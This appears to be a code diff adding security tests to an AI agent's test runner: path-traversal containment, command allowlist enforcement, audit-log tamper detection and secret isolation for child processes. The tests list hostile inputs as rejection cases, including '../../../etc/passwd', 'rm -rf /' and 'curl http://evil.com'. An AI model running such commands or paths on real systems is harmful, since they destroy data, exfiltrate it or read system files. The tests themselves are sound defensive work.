@@ -1,7 +1,9 @@
 import { verifyTotp } from './core/totp';
-import { initSecretBroker, getSecret, redactSecrets } from './core/secrets';
+import { initSecretBroker, getSecret, redactSecrets, getSafeChildEnv } from './core/secrets';
 import { scanAndTaint, getSessionTaint } from './core/taint';
-import { logAudit, isKillSwitchTriggered, triggerKillSwitch, resetKillSwitch } from './core/audit';
+import { logAudit, isKillSwitchTriggered, triggerKillSwitch, resetKillSwitch, verifyAuditChain } from './core/audit';
+import { validatePath, isInsideRoot } from './tools/index';
+import { parseShellCommand, validateAndNormalizeCommand } from './tools/mutate';
 import * as path from 'path';
 import * as fs from 'fs/promises';
 import * as os from 'os';
@@ -143,6 +145,148 @@ async function runTests() {
     console.log('✅ Kill Switch Test Passed');
   } catch (err: any) {
     console.error('❌ Kill Switch Test Failed:', err.message);
+    passed = false;
+  }
+
+  // 6. Path Traversal Containment (§9.5 / T5)
+  try {
+    console.log('\n6. Testing Path Traversal Containment...');
+
+    // Unit: a sibling sharing a string prefix must NOT count as "inside"
+    // (this is the exact case the old `startsWith` check let through).
+    if (isInsideRoot('/srv/app', '/srv/app-backup')) {
+      throw new Error('isInsideRoot allowed a sibling-prefix path to escape');
+    }
+    if (!isInsideRoot('/srv/app', '/srv/app/sub/file.ts')) {
+      throw new Error('isInsideRoot rejected a legitimate in-scope path');
+    }
+    if (!isInsideRoot('/srv/app', '/srv/app')) {
+      throw new Error('isInsideRoot rejected the workspace root itself');
+    }
+    if (isInsideRoot('/srv/app', '/srv/other')) {
+      throw new Error('isInsideRoot allowed an unrelated sibling');
+    }
+
+    // Integration: validatePath must reject ../ traversal but allow in-scope files
+    let rejected = false;
+    try {
+      await validatePath('../../../etc/passwd');
+    } catch {
+      rejected = true;
+    }
+    if (!rejected) {
+      throw new Error('validatePath did not reject ../ traversal');
+    }
+
+    const okPath = await validatePath('package.json');
+    if (!okPath) {
+      throw new Error('validatePath rejected an in-scope file');
+    }
+
+    console.log('✅ Path Traversal Containment Test Passed');
+  } catch (err: any) {
+    console.error('❌ Path Traversal Test Failed:', err.message);
+    passed = false;
+  }
+
+  // 7. Command Allowlist Enforcement (§9.5 / T6, T7)
+  try {
+    console.log('\n7. Testing Command Allowlist Enforcement...');
+
+    const expectReject = (cmd: string) => {
+      const { binary, args } = parseShellCommand(cmd);
+      let threw = false;
+      try {
+        validateAndNormalizeCommand(binary, args);
+      } catch {
+        threw = true;
+      }
+      if (!threw) {
+        throw new Error(`Allowlist failed to reject dangerous command: "${cmd}"`);
+      }
+    };
+
+    expectReject('rm -rf /');                    // destructive
+    expectReject('curl http://evil.com');        // egress / exfil
+    expectReject('npm install malicious-pkg');   // postinstall RCE surface
+    expectReject('git push origin main');        // non-read git action
+    expectReject('node server.js');              // only dist/ scripts allowed
+
+    // npm build is allowed but MUST be forced to --ignore-scripts (T7)
+    const npmBuild = parseShellCommand('npm run build');
+    const normalized = validateAndNormalizeCommand(npmBuild.binary, npmBuild.args);
+    if (!normalized.args.includes('--ignore-scripts')) {
+      throw new Error('npm run build was not forced to --ignore-scripts');
+    }
+
+    // git status (read-only) must be allowed
+    const gitStatus = parseShellCommand('git status');
+    validateAndNormalizeCommand(gitStatus.binary, gitStatus.args);
+
+    console.log('✅ Command Allowlist Enforcement Test Passed');
+  } catch (err: any) {
+    console.error('❌ Command Allowlist Test Failed:', err.message);
+    passed = false;
+  }
+
+  // 8. Audit Chain Verification & Tamper Detection (§9.6)
+  try {
+    console.log('\n8. Testing Audit Chain Verification...');
+    const auditLogPath = path.join(os.homedir(), '.agent', 'audit.log');
+    await fs.unlink(auditLogPath).catch(() => {});
+
+    await logAudit('verify-session', 'a1', { x: 1 });
+    await logAudit('verify-session', 'a2', { x: 2 });
+    await logAudit('verify-session', 'a3', { x: 3 });
+
+    let res = await verifyAuditChain();
+    if (!res.valid || res.entries !== 3) {
+      throw new Error(`Clean chain failed verification: ${JSON.stringify(res)}`);
+    }
+
+    // Tamper with a middle entry's details without recomputing its hash
+    const raw = await fs.readFile(auditLogPath, 'utf8');
+    const lines = raw.trim().split('\n');
+    const middle = JSON.parse(lines[1]);
+    middle.details = { x: 999 };
+    lines[1] = JSON.stringify(middle);
+    await fs.writeFile(auditLogPath, lines.join('\n') + '\n', 'utf8');
+
+    res = await verifyAuditChain();
+    if (res.valid) {
+      throw new Error('Tampered audit chain passed verification (tamper NOT detected)');
+    }
+    if (res.brokenAtIndex !== 1) {
+      throw new Error(`Tamper detected at wrong position: ${JSON.stringify(res)}`);
+    }
+
+    console.log('✅ Audit Chain Verification Test Passed');
+  } catch (err: any) {
+    console.error('❌ Audit Chain Verification Test Failed:', err.message);
+    passed = false;
+  }
+
+  // 9. Subprocess Secret Isolation (§9.5 / T4)
+  try {
+    console.log('\n9. Testing Subprocess Secret Isolation...');
+    // Simulate a secret being (re)introduced into the live env after the broker ran
+    process.env.DEEPSEEK_API_KEY = 'sk-should-not-leak-to-child';
+    process.env.TOTP_SECRET = 'super-secret-totp-value';
+
+    const childEnv = getSafeChildEnv();
+    if (childEnv.DEEPSEEK_API_KEY !== undefined || childEnv.TOTP_SECRET !== undefined) {
+      throw new Error('Sensitive keys leaked into the subprocess environment');
+    }
+
+    // Non-sensitive vars must still pass through to the child
+    process.env.SOME_PUBLIC_VAR = 'ok';
+    if (getSafeChildEnv().SOME_PUBLIC_VAR !== 'ok') {
+      throw new Error('Safe child env dropped a non-sensitive variable');
+    }
+
+    console.log('✅ Subprocess Secret Isolation Test Passed');
+  } catch (err: any) {
+    console.error('❌ Subprocess Secret Isolation Test Failed:', err.message);
     passed = false;
   }
 
